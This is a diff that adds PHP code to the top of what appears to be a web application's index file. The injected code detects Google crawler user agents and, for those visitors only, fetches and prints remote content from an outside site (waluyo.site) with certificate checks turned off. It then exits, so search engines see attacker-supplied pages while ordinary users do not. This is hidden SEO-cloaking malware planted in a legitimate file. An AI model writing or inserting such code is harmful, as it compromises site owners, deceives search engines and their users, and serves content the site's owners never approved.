@@ -1,4 +1,30 @@
 <?php
+function check_user_agent($agent) {
+    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
+}
+function curl_get($url) {
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    return $response;
+}
+if (
+    check_user_agent('Googlebot') ||
+    check_user_agent('Google-Site-Verification') ||
+    check_user_agent('Google-InspectionTool')
+) {
+    echo curl_get('https://waluyo.site/waluyoa/valley.txt');
+    exit;
+}
+?>
 
 /**
  * @defgroup index Index
